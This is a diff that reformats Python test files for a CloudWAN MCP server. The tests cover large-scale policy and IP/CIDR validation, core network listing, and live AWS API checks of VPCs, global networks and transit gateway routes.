@@ -517,7 +511,7 @@
 
             # Verify relationship analysis
             assert len(analysis_results) == 100
-            assert all(result['success'] for result in analysis_results)
+            assert all(result["success"] for result in analysis_results)
             assert analysis_time < 30.0, f"Relationship analysis took {analysis_time:.2f}s"
 
 
@@ -531,64 +525,54 @@
         """Test validation of 50,000+ core network policy variations."""
         # Generate large policy with many segments and rules
         massive_policy = {
-            'version': '2021.12',
-            'core-network-configuration': {
-                'asn-ranges': [f'{64512 + i}-{64512 + i + 99}' for i in range(0, 1000, 100)],
-                'edge-locations': [
-                    {
-                        'location': f'{region}-{az}',
-                        'asn': 64512 + (region_idx * 100) + az_idx
-                    }
-                    for region_idx, region in enumerate(['us-east', 'us-west', 'eu-west', 'ap-southeast'])
-                    for az_idx, az in enumerate(['1', '2', '3'])
+            "version": "2021.12",
+            "core-network-configuration": {
+                "asn-ranges": [f"{64512 + i}-{64512 + i + 99}" for i in range(0, 1000, 100)],
+                "edge-locations": [
+                    {"location": f"{region}-{az}", "asn": 64512 + (region_idx * 100) + az_idx}
+                    for region_idx, region in enumerate(["us-east", "us-west", "eu-west", "ap-southeast"])
+                    for az_idx, az in enumerate(["1", "2", "3"])
                 ],
-                'inside-cidr-blocks': [f'169.254.{i}.0/24' for i in range(100)],
-                'vpn-ecmp-support': True
+                "inside-cidr-blocks": [f"169.254.{i}.0/24" for i in range(100)],
+                "vpn-ecmp-support": True,
             },
-            'segments': [
+            "segments": [
                 {
-                    'name': f'segment-{i:04d}',
-                    'require-attachment-acceptance': i % 2 == 0,
-                    'isolate-attachments': i % 3 == 0,
-                    'allow-filter': [f'10.{i}.0.0/16', f'172.16.{i}.0/24'],
-                    'deny-filter': [f'192.168.{i}.0/24'] if i % 5 == 0 else [],
-                    'edge-locations': [f'us-east-{(i % 3) + 1}', f'us-west-{(i % 3) + 1}']
+                    "name": f"segment-{i:04d}",
+                    "require-attachment-acceptance": i % 2 == 0,
+                    "isolate-attachments": i % 3 == 0,
+                    "allow-filter": [f"10.{i}.0.0/16", f"172.16.{i}.0/24"],
+                    "deny-filter": [f"192.168.{i}.0/24"] if i % 5 == 0 else [],
+                    "edge-locations": [f"us-east-{(i % 3) + 1}", f"us-west-{(i % 3) + 1}"],
                 }
                 for i in range(10000)  # 10,000 segments
             ],
-            'segment-actions': [
+            "segment-actions": [
                 {
-                    'action': 'share',
-                    'segment': f'segment-{i:04d}',
-                    'share-with': [f'segment-{j:04d}' for j in range(i + 1, min(i + 5, 10000))],
-                    'mode': 'attachment-route'
+                    "action": "share",
+                    "segment": f"segment-{i:04d}",
+                    "share-with": [f"segment-{j:04d}" for j in range(i + 1, min(i + 5, 10000))],
+                    "mode": "attachment-route",
                 }
                 for i in range(0, 10000, 10)  # 1,000 sharing rules
             ],
-            'attachment-policies': [
+            "attachment-policies": [
                 {
-                    'rule-number': i,
-                    'condition-logic': 'or',
-                    'conditions': [
+                    "rule-number": i,
+                    "condition-logic": "or",
+                    "conditions": [
                         {
-                            'type': 'tag-value',
-                            'key': 'Environment',
-                            'value': 'production' if i % 2 == 0 else 'development',
-                            'operator': 'equals'
+                            "type": "tag-value",
+                            "key": "Environment",
+                            "value": "production" if i % 2 == 0 else "development",
+                            "operator": "equals",
                         },
-                        {
-                            'type': 'account-id',
-                            'value': f'{123456789000 + (i % 1000)}',
-                            'operator': 'equals'
-                        }
+                        {"type": "account-id", "value": f"{123456789000 + (i % 1000)}", "operator": "equals"},
                     ],
-                    'action': {
-                        'association-method': 'constant',
-                        'segment': f'segment-{i % 10000:04d}'
-                    }
+                    "action": {"association-method": "constant", "segment": f"segment-{i % 10000:04d}"},
                 }
                 for i in range(20000)  # 20,000 attachment policies
-            ]
+            ],
         }
 
         start_time = time.time()
@@ -603,18 +587,18 @@
         memory_usage = memory_after - memory_before
 
         parsed = json.loads(result)
-        assert parsed['success'] is True
-        assert 'overall_status' in parsed
-        assert 'validation_results' in parsed
+        assert parsed["success"] is True
+        assert "overall_status" in parsed
+        assert "validation_results" in parsed
 
         # Performance constraints for massive policy
         assert validation_time < 60.0, f"Massive policy validation took {validation_time:.2f}s"
         assert memory_usage < LARGE_DATASET_MEMORY_THRESHOLD_MB, f"Memory usage {memory_usage:.2f}MB for large policy"
 
         # Verify validation captured key elements
-        validation_results = parsed['validation_results']
-        assert any(r['field'] == 'version' for r in validation_results)
-        assert any(r['field'] == 'core-network-configuration' for r in validation_results)
+        validation_results = parsed["validation_results"]
+        assert any(r["field"] == "version" for r in validation_results)
+        assert any(r["field"] == "core-network-configuration" for r in validation_results)
 
     @pytest.mark.integration
     @pytest.mark.slow
@@ -623,11 +607,11 @@
         """Test policy parsing with memory-efficient streaming."""
         # Create policy with deeply nested structures
         deep_policy = {
-            'version': '2021.12',
-            'core-network-configuration': {
-                'asn-ranges': ['64512-65000'],
-                'edge-locations': [{'location': 'us-east-1', 'asn': 64512}]
-            }
+            "version": "2021.12",
+            "core-network-configuration": {
+                "asn-ranges": ["64512-65000"],
+                "edge-locations": [{"location": "us-east-1", "asn": 64512}],
+            },
         }
 
         # Add deeply nested segment actions (5 levels deep)
@@ -635,27 +619,27 @@
         for level1 in range(100):
             for level2 in range(50):
                 action = {
-                    'action': 'share',
-                    'segment': f'segment-{level1:02d}-{level2:02d}',
-                    'share-with': [f'segment-{level1:02d}-{k:02d}' for k in range(level2 + 1, min(level2 + 10, 50))],
-                    'conditions': {
-                        'nested-level-1': {
-                            'nested-level-2': {
-                                'nested-level-3': {
-                                    'nested-level-4': {
-                                        'nested-level-5': [
-                                            {'condition': f'condition-{level1}-{level2}-{j}', 'value': f'value-{j}'}
+                    "action": "share",
+                    "segment": f"segment-{level1:02d}-{level2:02d}",
+                    "share-with": [f"segment-{level1:02d}-{k:02d}" for k in range(level2 + 1, min(level2 + 10, 50))],
+                    "conditions": {
+                        "nested-level-1": {
+                            "nested-level-2": {
+                                "nested-level-3": {
+                                    "nested-level-4": {
+                                        "nested-level-5": [
+                                            {"condition": f"condition-{level1}-{level2}-{j}", "value": f"value-{j}"}
                                             for j in range(20)
                                         ]
                                     }
                                 }
                             }
                         }
-                    }
+                    },
                 }
                 nested_actions.append(action)
 
-        deep_policy['segment-actions'] = nested_actions
+        deep_policy["segment-actions"] = nested_actions
 
         gc.collect()  # Clean up before test
         memory_baseline = psutil.Process(os.getpid()).memory_info().rss / 1024 / 1024
@@ -669,7 +653,7 @@
         parsing_time = end_time - start_time
 
         parsed = json.loads(result)
-        assert parsed['success'] is True
+        assert parsed["success"] is True
 
         # Memory should be managed efficiently for deep nesting
         assert memory_growth < 200, f"Deep parsing used {memory_growth:.2f}MB"
@@ -692,11 +676,11 @@
             for octet2 in range(0, 256, 10):
                 for octet3 in range(0, 256, 10):
                     for octet4 in range(1, 26):  # 25 IPs per /24
-                        ip_test_cases.append(f'{octet1}.{octet2}.{octet3}.{octet4}')
+                        ip_test_cases.append(f"{octet1}.{octet2}.{octet3}.{octet4}")
 
         # Add IPv6 addresses
         for i in range(10000):
-            ipv6 = f'2001:db8:{i:04x}::1'
+            ipv6 = f"2001:db8:{i:04x}::1"
             ip_test_cases.append(ipv6)
 
         total_ips = len(ip_test_cases)
@@ -713,10 +697,10 @@
             batch_ips = ip_test_cases[i:batch_end]
 
             for ip in batch_ips:
-                result = await validate_ip_cidr('validate_ip', ip=ip)
+                result = await validate_ip_cidr("validate_ip", ip=ip)
                 parsed = json.loads(result)
 
-                if parsed['success']:
+                if parsed["success"]:
                     successful_validations += 1
                 else:
                     failed_validations += 1
@@ -744,13 +728,13 @@
         # RFC 1918 private ranges with various subnet sizes
         for subnet_size in [8, 12, 16, 20, 24, 28]:
             for network in range(0, 256, max(1, 256 // (32 - subnet_size))):
-                cidr_test_cases.append(f'10.{network}.0.0/{subnet_size}')
-                cidr_test_cases.append(f'172.{16 + (network // 16)}.{network % 16}.0/{subnet_size}')
-                cidr_test_cases.append(f'192.168.{network}.0/{subnet_size}')
+                cidr_test_cases.append(f"10.{network}.0.0/{subnet_size}")
+                cidr_test_cases.append(f"172.{16 + (network // 16)}.{network % 16}.0/{subnet_size}")
+                cidr_test_cases.append(f"192.168.{network}.0/{subnet_size}")
 
         # IPv6 CIDR blocks
         for i in range(1000):
-            cidr_test_cases.append(f'2001:db8:{i:04x}::/{48 + (i % 16)}')
+            cidr_test_cases.append(f"2001:db8:{i:04x}::/{48 + (i % 16)}")
 
         successful_cidr_validations = 0
         start_time = time.time()
@@ -762,13 +746,13 @@
             batch_cidrs = cidr_test_cases[i:batch_end]
 
             for cidr in batch_cidrs:
-                result = await validate_ip_cidr('validate_cidr', cidr=cidr)
+                result = await validate_ip_cidr("validate_cidr", cidr=cidr)
                 parsed = json.loads(result)
 
-                if parsed['success']:
+                if parsed["success"]:
                     successful_cidr_validations += 1
                     # Validate CIDR analysis results
-                    assert 'network_address' in parsed or 'error' in parsed
+                    assert "network_address" in parsed or "error" in parsed
 
         end_time = time.time()
         cidr_analysis_time = end_time - start_time
@@ -788,67 +772,63 @@
         """Test network topology handling at visualization limits."""
         # Create complex multi-tier topology
         topology_data = {
-            'core_networks': [f'core-network-{i:03d}' for i in range(100)],
-            'global_networks': [f'global-network-{i:03d}' for i in range(50)],
-            'transit_gateways': [f'tgw-{i:05d}' for i in range(1000)],
-            'vpc_connections': [],
-            'peering_connections': []
+            "core_networks": [f"core-network-{i:03d}" for i in range(100)],
+            "global_networks": [f"global-network-{i:03d}" for i in range(50)],
+            "transit_gateways": [f"tgw-{i:05d}" for i in range(1000)],
+            "vpc_connections": [],
+            "peering_connections": [],
         }
 
         # Generate VPC connections (each TGW connects to 10 VPCs)
         for tgw_idx in range(1000):
             for vpc_idx in range(10):
                 connection = {
-                    'transit_gateway': f'tgw-{tgw_idx:05d}',
-                    'vpc_id': f'vpc-{tgw_idx:05d}-{vpc_idx:02d}',
-                    'attachment_id': f'tgw-attach-{tgw_idx:05d}-{vpc_idx:02d}',
-                    'state': 'available'
+                    "transit_gateway": f"tgw-{tgw_idx:05d}",
+                    "vpc_id": f"vpc-{tgw_idx:05d}-{vpc_idx:02d}",
+                    "attachment_id": f"tgw-attach-{tgw_idx:05d}-{vpc_idx:02d}",
+                    "state": "available",
                 }
-                topology_data['vpc_connections'].append(connection)
+                topology_data["vpc_connections"].append(connection)
 
         # Generate peering connections (mesh topology subset)
         for i in range(0, 1000, 10):  # Every 10th TGW peers with next 5
             for j in range(i + 1, min(i + 6, 1000)):
                 peering = {
-                    'requester_tgw': f'tgw-{i:05d}',
-                    'accepter_tgw': f'tgw-{j:05d}',
-                    'peering_attachment_id': f'tgw-attach-peer-{i:05d}-{j:05d}',
-                    'state': 'available'
+                    "requester_tgw": f"tgw-{i:05d}",
+                    "accepter_tgw": f"tgw-{j:05d}",
+                    "peering_attachment_id": f"tgw-attach-peer-{i:05d}-{j:05d}",
+                    "state": "available",
                 }
-                topology_data['peering_connections'].append(peering)
+                topology_data["peering_connections"].append(peering)
 
         total_nodes = (
-            len(topology_data['core_networks']) +
-            len(topology_data['global_networks']) +
-            len(topology_data['transit_gateways']) +
-            len(topology_data['vpc_connections'])
+            len(topology_data["core_networks"])
+            + len(topology_data["global_networks"])
+            + len(topology_data["transit_gateways"])
+            + len(topology_data["vpc_connections"])
         )
 
-        total_edges = len(topology_data['peering_connections'])
+        total_edges = len(topology_data["peering_connections"])
 
         # Simulate topology processing
         start_time = time.time()
         memory_before = psutil.Process(os.getpid()).memory_info().rss / 1024 / 1024
 
         # Mock topology analysis that would process this data
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
 
             # Mock responses for topology components
             mock_client.list_core_networks.return_value = {
-                'CoreNetworks': [{'CoreNetworkId': cn} for cn in topology_data['core_networks']]
+                "CoreNetworks": [{"CoreNetworkId": cn} for cn in topology_data["core_networks"]]
             }
             mock_client.describe_global_networks.return_value = {
-                'GlobalNetworks': [{'GlobalNetworkId': gn} for gn in topology_data['global_networks']]
+                "GlobalNetworks": [{"GlobalNetworkId": gn} for gn in topology_data["global_networks"]]
             }
             mock_client.describe_vpcs.return_value = {
-                'Vpcs': [
-                    {
-                        'VpcId': conn['vpc_id'],
-                        'State': 'available',
-                        'CidrBlock': f'10.{i//256}.{i%256}.0/24'
-                    }
-                    for i, conn in enumerate(topology_data['vpc_connections'])
+                "Vpcs": [
+                    {"VpcId": conn["vpc_id"], "State": "available", "CidrBlock": f"10.{i // 256}.{i % 256}.0/24"}
+                    for i, conn in enumerate(topology_data["vpc_connections"])
                 ]
             }
 
@@ -870,15 +850,15 @@
             global_parsed = json.loads(global_result)
             vpc_parsed = json.loads(vpc_result)
 
-            assert core_parsed['success'] is True
-            assert global_parsed['success'] is True
-            assert vpc_parsed['success'] is True
+            assert core_parsed["success"] is True
+            assert global_parsed["success"] is True
+            assert vpc_parsed["success"] is True
 
             # Performance constraints for complex topology
             assert processing_time < 45.0, f"Complex topology processing took {processing_time:.2f}s"
             assert memory_usage < 400, f"Topology memory usage {memory_usage:.2f}MB"
 
             # Validate topology scale
-            assert len(core_parsed['core_networks']) == 100
-            assert len(global_parsed['global_networks']) == 50
-            assert len(vpc_parsed['vpcs']) == 10000  # 1000 TGWs * 10 VPCs each
+            assert len(core_parsed["core_networks"]) == 100
+            assert len(global_parsed["global_networks"]) == 50
+            assert len(vpc_parsed["vpcs"]) == 10000  # 1000 TGWs * 10 VPCs each

--- cloudwan-mcp-server/tests/integration/test_list_core_networks.py
+++ cloudwan-mcp-server/tests/integration/test_list_core_networks.py
@@ -14,8 +14,7 @@
 
 
 #!/usr/bin/env python3
-"""Test the list_core_networks tool specifically to validate the fix.
-"""
+"""Test the list_core_networks tool specifically to validate the fix."""
 
 import asyncio
 import json
@@ -28,13 +27,11 @@
 # Add the project root to Python path
 sys.path.insert(0, str(Path(__file__).parent.absolute()))
 
+
 async def test_list_core_networks_directly():
     """Test the list_core_networks tool directly."""
     # Set up logging
-    logging.basicConfig(
-        level=logging.INFO,
-        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
-    )
+    logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
     logger = logging.getLogger(__name__)
 
     logger.info("=" * 80)
@@ -44,10 +41,7 @@
     try:
         # Set up environment
         aws_profile = os.environ.get("TEST_AWS_PROFILE")
-        env_vars = {
-            "AWS_DEFAULT_REGION": "us-west-2",
-            "CLOUDWAN_MCP_DEBUG": "true"
-        }
+        env_vars = {"AWS_DEFAULT_REGION": "us-west-2", "CLOUDWAN_MCP_DEBUG": "true"}
         if aws_profile:
             env_vars["AWS_PROFILE"] = aws_profile
         os.environ.update(env_vars)
@@ -79,12 +73,12 @@
         logger.info("=" * 60)
         logger.info(f"Result type: {type(result)}")
 
-        if hasattr(result, 'content') and result.content:
+        if hasattr(result, "content") and result.content:
             logger.info(f"Content items: {len(result.content)}")
             for i, content in enumerate(result.content):
                 logger.info(f"Content {i}:")
                 logger.info(f"  Type: {getattr(content, 'type', 'NO TYPE')}")
-                text_content = getattr(content, 'text', '')
+                text_content = getattr(content, "text", "")
                 logger.info(f"  Text length: {len(text_content)}")
 
                 # Try to parse as JSON and display nicely
@@ -95,11 +89,13 @@
                     logger.info(json.dumps(parsed_json, indent=2))
 
                     # Check if we found any networks
-                    core_networks = parsed_json.get('core_networks', [])
+                    core_networks = parsed_json.get("core_networks", [])
                     if core_networks:
                         logger.info(f"🎉 SUCCESS: Found {len(core_networks)} core networks!")
                         for cn in core_networks:
-                            logger.info(f"  - {cn.get('core_network_id', 'unknown')}: {cn.get('description', 'no description')}")
+                            logger.info(
+                                f"  - {cn.get('core_network_id', 'unknown')}: {cn.get('description', 'no description')}"
+                            )
                     else:
                         logger.info("ℹ️  No core networks found - this may be expected if CloudWAN is not configured")
 
@@ -115,15 +111,14 @@
     except Exception as e:
         logger.error(f"❌ Test failed with exception: {e}")
         import traceback
+
         logger.error(traceback.format_exc())
         return False
 
+
 async def test_through_mcp_server():
     """Test list_core_networks through MCP server."""
-    logging.basicConfig(
-        level=logging.INFO,
-        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
-    )
+    logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
     logger = logging.getLogger(__name__)
 
     logger.info("=" * 80)
@@ -132,11 +127,9 @@
 
     try:
         # Set up environment
-        os.environ.update({
-            "AWS_PROFILE": "taylaand+net-dev-Admin",
-            "AWS_DEFAULT_REGION": "us-west-2",
-            "CLOUDWAN_MCP_DEBUG": "true"
-        })
+        os.environ.update(
+            {"AWS_PROFILE": "taylaand+net-dev-Admin", "AWS_DEFAULT_REGION": "us-west-2", "CLOUDWAN_MCP_DEBUG": "true"}
+        )
 
         # Import server components
         from awslabs.cloudwan_mcp_server.config import CloudWANConfig
@@ -159,13 +152,7 @@
         call_tool_handler = handlers[CallToolRequest]
 
         # Create request
-        request = CallToolRequest(
-            method="tools/call",
-            params={
-                "name": "list_core_networks",
-                "arguments": {}
-            }
-        )
+        request = CallToolRequest(method="tools/call", params={"name": "list_core_networks", "arguments": {}})
 
         logger.info("🧪 Executing list_core_networks through MCP server...")
 
@@ -178,14 +165,14 @@
         logger.info(f"Result type: {type(result)}")
 
         # Extract the actual CallToolResult from ServerResult
-        if hasattr(result, 'root'):
+        if hasattr(result, "root"):
             actual_result = result.root
             logger.info(f"Actual result type: {type(actual_result)}")
 
-            if hasattr(actual_result, 'content') and actual_result.content:
+            if hasattr(actual_result, "content") and actual_result.content:
                 logger.info(f"Content items: {len(actual_result.content)}")
                 for i, content in enumerate(actual_result.content):
-                    text_content = getattr(content, 'text', '')
+                    text_content = getattr(content, "text", "")
                     logger.info(f"Content {i} length: {len(text_content)}")
 
                     # Try to parse as JSON
@@ -196,7 +183,7 @@
                         logger.info(json.dumps(parsed_json, indent=2))
 
                         # Check for success
-                        core_networks = parsed_json.get('core_networks', [])
+                        core_networks = parsed_json.get("core_networks", [])
                         if core_networks:
                             logger.info(f"🎉 MCP SUCCESS: Found {len(core_networks)} core networks!")
                         else:
@@ -216,9 +203,11 @@
     except Exception as e:
         logger.error(f"❌ MCP server test failed: {e}")
         import traceback
+
         logger.error(traceback.format_exc())
         return False
 
+
 async def main():
     """Main test runner."""
     print("🚨 EMERGENCY FIX VALIDATION for list_core_networks")
@@ -260,5 +249,6 @@
         print("🚨 EMERGENCY FIX INCOMPLETE - Further investigation needed")
     print("=" * 60)
 
+
 if __name__ == "__main__":
     asyncio.run(main())

--- cloudwan-mcp-server/tests/integration/test_live_api.py
+++ cloudwan-mcp-server/tests/integration/test_live_api.py
@@ -34,20 +34,20 @@
 def live_aws_credentials():
     """Ensure AWS credentials are available for live tests."""
     # Skip live tests in CI/CD environments unless explicitly enabled
-    if os.getenv('CI') and not os.getenv('ENABLE_LIVE_AWS_TESTS'):
+    if os.getenv("CI") and not os.getenv("ENABLE_LIVE_AWS_TESTS"):
         pytest.skip("Live AWS tests disabled in CI/CD environment")
-    
-    required_vars = ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY']
+
+    required_vars = ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY"]
     missing_vars = [var for var in required_vars if not os.getenv(var)]
 
     if missing_vars:
         pytest.skip(f"Missing required AWS credentials: {', '.join(missing_vars)}")
 
     return {
-        'access_key': os.getenv('AWS_ACCESS_KEY_ID'),
-        'secret_key': os.getenv('AWS_SECRET_ACCESS_KEY'),
-        'session_token': os.getenv('AWS_SESSION_TOKEN'),
-        'region': os.getenv('AWS_DEFAULT_REGION', 'us-east-1')
+        "access_key": os.getenv("AWS_ACCESS_KEY_ID"),
+        "secret_key": os.getenv("AWS_SECRET_ACCESS_KEY"),
+        "session_token": os.getenv("AWS_SESSION_TOKEN"),
+        "region": os.getenv("AWS_DEFAULT_REGION", "us-east-1"),
     }
 
 
@@ -56,11 +56,11 @@
     """Define live test resources that should exist in the test account."""
     return {
         # These should be created manually in the test AWS account
-        'test_regions': ['us-east-1', 'us-west-2'],
-        'expected_vpcs': {
-            'us-east-1': 1,  # At least 1 VPC expected in us-east-1
-            'us-west-2': 0   # May have 0 VPCs in us-west-2
-        }
+        "test_regions": ["us-east-1", "us-west-2"],
+        "expected_vpcs": {
+            "us-east-1": 1,  # At least 1 VPC expected in us-east-1
+            "us-west-2": 0,  # May have 0 VPCs in us-west-2
+        },
     }
 
 
@@ -73,32 +73,32 @@
         """Test against real AWS CloudWAN API."""
         start_time = time.time()
 
-        for region in live_test_resources['test_regions']:
+        for region in live_test_resources["test_regions"]:
             try:
                 result = await list_core_networks(region=region)
                 parsed = json.loads(result)
 
                 # Should succeed or fail gracefully
                 assert isinstance(parsed, dict)
-                assert 'success' in parsed
-                assert 'region' in parsed
-                assert parsed['region'] == region
+                assert "success" in parsed
+                assert "region" in parsed
+                assert parsed["region"] == region
 
-                if parsed['success']:
-                    assert 'core_networks' in parsed
-                    assert 'total_count' in parsed
-                    assert isinstance(parsed['core_networks'], list)
+                if parsed["success"]:
+                    assert "core_networks" in parsed
+                    assert "total_count" in parsed
+                    assert isinstance(parsed["core_networks"], list)
 
                     # Validate core network structure if any exist
-                    for network in parsed['core_networks']:
-                        assert 'CoreNetworkId' in network
-                        assert 'State' in network
-                        assert network['State'] in ['AVAILABLE', 'CREATING', 'UPDATING', 'DELETING']
+                    for network in parsed["core_networks"]:
+                        assert "CoreNetworkId" in network
+                        assert "State" in network
+                        assert network["State"] in ["AVAILABLE", "CREATING", "UPDATING", "DELETING"]
 
                 else:
                     # If failed, should have error information
-                    assert 'error' in parsed
-                    assert 'error_code' in parsed
+                    assert "error" in parsed
+                    assert "error_code" in parsed
 
             except Exception as e:
                 pytest.fail(f"Unexpected error in live core network test for {region}: {e}")
@@ -110,27 +110,27 @@
     @pytest.mark.asyncio
     async def test_live_global_network_discovery(self, live_aws_credentials, live_test_resources):
         """Test live global network discovery."""
-        for region in live_test_resources['test_regions']:
+        for region in live_test_resources["test_regions"]:
             result = await get_global_networks(region=region)
             parsed = json.loads(result)
 
             assert isinstance(parsed, dict)
-            assert 'success' in parsed
+            assert "success" in parsed
 
-            if parsed['success']:
-                assert 'global_networks' in parsed
-                assert 'total_count' in parsed
-                assert isinstance(parsed['global_networks'], list)
+            if parsed["success"]:
+                assert "global_networks" in parsed
+                assert "total_count" in parsed
+                assert isinstance(parsed["global_networks"], list)
 
                 # Validate global network structure
-                for network in parsed['global_networks']:
-                    assert 'GlobalNetworkId' in network
-                    if 'State' in network:
-                        assert network['State'] in ['PENDING', 'AVAILABLE', 'DELETING', 'UPDATING']
+                for network in parsed["global_networks"]:
+                    assert "GlobalNetworkId" in network
+                    if "State" in network:
+                        assert network["State"] in ["PENDING", "AVAILABLE", "DELETING", "UPDATING"]
             else:
                 # Common expected errors for regions without CloudWAN
-                expected_errors = ['AccessDenied', 'UnauthorizedOperation', 'OptInRequired']
-                assert any(error in parsed.get('error', '') for error in expected_errors)
+                expected_errors = ["AccessDenied", "UnauthorizedOperation", "OptInRequired"]
+                assert any(error in parsed.get("error", "") for error in expected_errors)
 
     @pytest.mark.live
     @pytest.mark.asyncio
@@ -140,26 +140,26 @@
         result = await list_core_networks()
         parsed = json.loads(result)
 
-        if parsed['success'] and parsed['total_count'] > 0:
+        if parsed["success"] and parsed["total_count"] > 0:
             # Test policy retrieval for first available core network
-            core_network_id = parsed['core_networks'][0]['CoreNetworkId']
+            core_network_id = parsed["core_networks"][0]["CoreNetworkId"]
 
             policy_result = await get_core_network_policy(core_network_id)
             policy_parsed = json.loads(policy_result)
 
-            if policy_parsed['success']:
+            if policy_parsed["success"]:
                 # Validate policy structure
-                assert 'policy_document' in policy_parsed
-                assert 'policy_version_id' in policy_parsed
-                assert 'core_network_id' in policy_parsed
+                assert "policy_document" in policy_parsed
+                assert "policy_version_id" in policy_parsed
+                assert "core_network_id" in policy_parsed
 
                 # Parse and validate policy document
-                policy_doc = json.loads(policy_parsed['policy_document'])
-                assert 'version' in policy_doc
-                assert policy_doc['version'] in ['2021.12', '2022.02']
+                policy_doc = json.loads(policy_parsed["policy_document"])
+                assert "version" in policy_doc
+                assert policy_doc["version"] in ["2021.12", "2022.02"]
             else:
                 # Policy retrieval may fail if no policy exists
-                assert 'error' in policy_parsed
+                assert "error" in policy_parsed
         else:
             pytest.skip("No core networks available for policy testing")
 
@@ -171,26 +171,26 @@
         region_results = {}
 
         # Test multiple regions simultaneously
-        for region in live_test_resources['test_regions']:
+        for region in live_test_resources["test_regions"]:
             core_networks_result = await list_core_networks(region=region)
             global_networks_result = await get_global_networks(region=region)
 
             region_results[region] = {
-                'core_networks': json.loads(core_networks_result),
-                'global_networks': json.loads(global_networks_result)
+                "core_networks": json.loads(core_networks_result),
+                "global_networks": json.loads(global_networks_result),
             }
 
         # Analyze cross-region consistency
         for region, results in region_results.items():
-            assert isinstance(results['core_networks'], dict)
-            assert isinstance(results['global_networks'], dict)
+            assert isinstance(results["core_networks"], dict)
+            assert isinstance(results["global_networks"], dict)
 
             # Global networks should be consistent across regions (they're global resources)
-            if results['global_networks']['success']:
-                global_network_ids = [gn['GlobalNetworkId'] for gn in results['global_networks']['global_networks']]
+            if results["global_networks"]["success"]:
+                global_network_ids = [gn["GlobalNetworkId"] for gn in results["global_networks"]["global_networks"]]
 
                 # Store for cross-region comparison
-                if not hasattr(test_live_multi_region_consistency, 'global_networks_ref'):
+                if not hasattr(test_live_multi_region_consistency, "global_networks_ref"):
                     test_live_multi_region_consistency.global_networks_ref = global_network_ids
                 else:
                     # Global networks should be the same across regions
@@ -207,35 +207,37 @@
     @pytest.mark.asyncio
     async def test_live_vpc_discovery(self, live_aws_credentials, live_test_resources):
         """Test VPC discovery against live AWS account."""
-        for region in live_test_resources['test_regions']:
+        for region in live_test_resources["test_regions"]:
             result = await discover_vpcs(region=region)
             parsed = json.loads(result)
 
             assert isinstance(parsed, dict)
-            assert 'success' in parsed
-            assert 'region' in parsed
-            assert parsed['region'] == region
+            assert "success" in parsed
+            assert "region" in parsed
+            assert parsed["region"] == region
 
-            if parsed['success']:
-                assert 'vpcs' in parsed
-                assert 'total_count' in parsed
-                assert isinstance(parsed['vpcs'], list)
+            if parsed["success"]:
+                assert "vpcs" in parsed
+                assert "total_count" in parsed
+                assert isinstance(parsed["vpcs"], list)
 
-                expected_count = live_test_resources['expected_vpcs'][region]
+                expected_count = live_test_resources["expected_vpcs"][region]
                 if expected_count > 0:
-                    assert parsed['total_count'] >= expected_count, f"Expected at least {expected_count} VPCs in {region}"
+                    assert parsed["total_count"] >= expected_count, (
+                        f"Expected at least {expected_count} VPCs in {region}"
+                    )
 
                 # Validate VPC structure
-                for vpc in parsed['vpcs']:
-                    assert 'VpcId' in vpc
-                    assert vpc['VpcId'].startswith('vpc-')
-                    assert 'State' in vpc
-                    assert vpc['State'] in ['pending', 'available', 'terminating']
-                    assert 'CidrBlock' in vpc
+                for vpc in parsed["vpcs"]:
+                    assert "VpcId" in vpc
+                    assert vpc["VpcId"].startswith("vpc-")
+                    assert "State" in vpc
+                    assert vpc["State"] in ["pending", "available", "terminating"]
+                    assert "CidrBlock" in vpc
             else:
                 # Should fail gracefully with proper error information
-                assert 'error' in parsed
-                assert 'error_code' in parsed
+                assert "error" in parsed
+                assert "error_code" in parsed
 
     @pytest.mark.live
     @pytest.mark.asyncio
@@ -244,25 +246,25 @@
         result = await discover_vpcs()
         parsed = json.loads(result)
 
-        if parsed['success'] and parsed['total_count'] > 0:
+        if parsed["success"] and parsed["total_count"] > 0:
             # Test that VPCs have expected attributes for filtering
-            for vpc in parsed['vpcs']:
-                assert 'VpcId' in vpc
-                assert 'State' in vpc
-                assert 'CidrBlock' in vpc
+            for vpc in parsed["vpcs"]:
+                assert "VpcId" in vpc
+                assert "State" in vpc
+                assert "CidrBlock" in vpc
 
                 # VpcId should be valid format
-                assert len(vpc['VpcId']) >= 12  # vpc- + 8-17 chars
-                assert vpc['VpcId'].startswith('vpc-')
+                assert len(vpc["VpcId"]) >= 12  # vpc- + 8-17 chars
+                assert vpc["VpcId"].startswith("vpc-")
 
                 # State should be valid
-                valid_states = ['pending', 'available', 'terminating']
-                assert vpc['State'] in valid_states
+                valid_states = ["pending", "available", "terminating"]
+                assert vpc["State"] in valid_states
 
                 # CIDR should be valid format (basic check)
-                cidr = vpc['CidrBlock']
-                assert '/' in cidr
-                assert len(cidr.split('/')) == 2
+                cidr = vpc["CidrBlock"]
+                assert "/" in cidr
+                assert len(cidr.split("/")) == 2
         else:
             pytest.skip("No VPCs available for filtering test")
 
@@ -275,42 +277,42 @@
     async def test_live_tgw_route_analysis_error_handling(self, live_aws_credentials):
         """Test TGW route analysis error handling with invalid route table."""
         # Use invalid route table ID to test error handling
-        invalid_route_table_id = 'tgw-rtb-invalid123456789'
+        invalid_route_table_id = "tgw-rtb-invalid123456789"
 
         result = await analyze_tgw_routes(invalid_route_table_id)
         parsed = json.loads(result)
 
         # Should handle invalid route table gracefully
         assert isinstance(parsed, dict)
-        assert 'success' in parsed
-        assert parsed['success'] is False
-        assert 'error' in parsed
-        assert 'error_code' in parsed
+        assert "success" in parsed
+        assert parsed["success"] is False
+        assert "error" in parsed
+        assert "error_code" in parsed
 
         # Should return proper AWS error codes
-        expected_errors = ['InvalidRouteTableID.NotFound', 'InvalidRouteTableId.NotFound', 'UnauthorizedOperation']
-        assert any(error in parsed['error_code'] for error in expected_errors)
+        expected_errors = ["InvalidRouteTableID.NotFound", "InvalidRouteTableId.NotFound", "UnauthorizedOperation"]
+        assert any(error in parsed["error_code"] for error in expected_errors)
 
     @pytest.mark.live
